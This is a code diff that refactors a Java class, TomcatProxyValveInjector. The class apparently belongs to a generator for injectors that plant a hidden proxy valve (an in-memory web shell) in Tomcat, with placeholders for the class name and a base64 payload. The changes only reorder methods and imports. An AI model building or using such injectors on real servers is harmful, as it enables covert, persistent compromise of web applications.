@@ -8,7 +8,9 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
-import java.util.*;
+import java.util.HashSet;
+import java.util.Map;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -20,6 +22,14 @@ public class TomcatProxyValveInjector implements InvocationHandler {
     private Object proxyValve;
     private static String msg = "";
     private static boolean ok = false;
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
 
     public TomcatProxyValveInjector() {
         if (ok) {
@@ -49,34 +59,9 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         System.out.println(msg);
     }
 
-    @SuppressWarnings("all")
-    private String getContextRoot(Object context) {
-        String r = null;
-        try {
-            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
-        } catch (Exception ignored) {
-        }
-        String c = context.getClass().getName();
-        if (r == null) {
-            return c;
-        }
-        if (r.isEmpty()) {
-            return c + "(/)";
-        }
-        return c + "(" + r + ")";
-    }
-
     public TomcatProxyValveInjector(Object rawValve, Object proxyValve) {
         this.rawValve = rawValve;
         this.proxyValve = proxyValve;
-    }
-
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() {
-        return "{{base64Str}}";
     }
 
     @Override
@@ -131,6 +116,23 @@ public class TomcatProxyValveInjector implements InvocationHandler {
             }
         }
         return contexts;
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     private ClassLoader getWebAppClassLoader(Object context) {
